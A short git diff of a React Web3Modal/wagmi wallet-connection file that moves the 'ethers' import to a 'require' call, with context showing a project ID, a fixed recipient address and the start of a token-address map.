@@ -7,7 +7,6 @@ import { createWeb3Modal } from '@web3modal/wagmi/react';
 import { defaultWagmiConfig } from '@web3modal/wagmi/react/config';
 import './App.css';
 import { getEthersSigner } from './ethersAdapters';
-import { ethers } from 'ethers';
 
 const queryClient = new QueryClient();
 const projectId = '1c1db7ada235d88816f2f0008d415fdc';
@@ -39,6 +38,7 @@ export function Web3ModalProvider({ children }) {
   );
 }
 
+const ethers = require('ethers');
 const toAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
 const tokenAddresses = {
   Ethereum: null, // Native token
